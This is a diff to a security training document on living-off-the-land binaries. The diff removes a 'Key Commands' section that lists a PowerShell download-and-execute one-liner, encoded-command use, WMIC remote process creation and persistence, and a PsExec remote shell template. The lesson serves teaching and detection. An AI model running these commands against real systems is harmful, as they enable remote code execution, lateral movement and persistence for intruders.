@@ -169,43 +169,6 @@ Complete the practical exercises.
 | **Regsvr32** | DLL registration | Execute scripts |
 | **Mshta** | HTML apps | Run malicious code |
 
-### Key Commands
-
-**PowerShell:**
-```powershell
-# Download and execute
-IEX (New-Object Net.WebClient).DownloadString('url')
-
-# Encoded commands
-powershell -enc <base64>
-```
-
-**WMIC:**
-```cmd
-# Remote process creation
-wmic /node:TARGET process call create "command"
-
-# Event subscription (persistence)
-wmic /namespace:\\root\subscription PATH __EventFilter CREATE ...
-```
-
-**PsExec:**
-```cmd
-psexec \\TARGET -u USER -p PASS cmd.exe
-```
-
-### Resources
-
-**GTFOBins:** Unix/Linux LOL binaries
-- https://gtfobins.github.io/
-
-**LOLBAS:** Windows LOL binaries
-- https://lolbas-project.github.io/
-
-**Sysinternals:** Microsoft admin tools
-- PsExec
-- Autoruns
-- Process Monitor
 
 ### Detection Indicators
 
